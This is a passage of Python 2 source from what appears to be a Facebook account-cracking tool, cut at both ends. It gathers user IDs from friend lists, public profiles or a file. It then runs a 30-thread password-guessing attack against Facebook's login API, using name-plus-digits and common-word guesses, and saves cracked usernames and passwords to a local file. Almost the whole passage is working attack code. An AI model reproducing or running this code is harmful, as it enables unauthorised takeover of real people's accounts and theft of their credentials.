                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Sayang786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_malay():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m01\x1b[1;97m]\x1b[1;92m Crack From Friend list'
    print '\x1b[1;97m[\x1b[1;93m02\x1b[1;97m]\x1b[1;92m Crack From Public Frendlist'
    print '\x1b[1;97m[\x1b[1;93m03\x1b[1;97m]\x1b[1;92m Crack From File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;91m Back'
    print '\x1b[1;96m--------------------------------------------------'
    pilih_malay()


def pilih_malay():
    teak = raw_input('\x1b[1;91mChoose Any Option \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
        pilih_malay()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo
            idt = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mID Public/friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public / friend does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No Internet Conection!'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                idlist = raw_input('\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mName File\x1b[1;91m :\x1b[1;92m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist ! '
                raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
            except IOError:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] File does not exist !'
                raw_input('\n\x1b[1;91m[\x1b[1;97m<Back>\x1b[1;91m]')
                crack_malay()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Fill Correctly !'
            pilih_malay()
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
        print '\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mStop Tekan CTRL+Z'
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[1;97m[\x1b[1;91m\xe2\x97\x8f\x1b[1;97m] \x1b[1;91mCrack Start ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'Kontol'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Sayang'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Malaysia'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
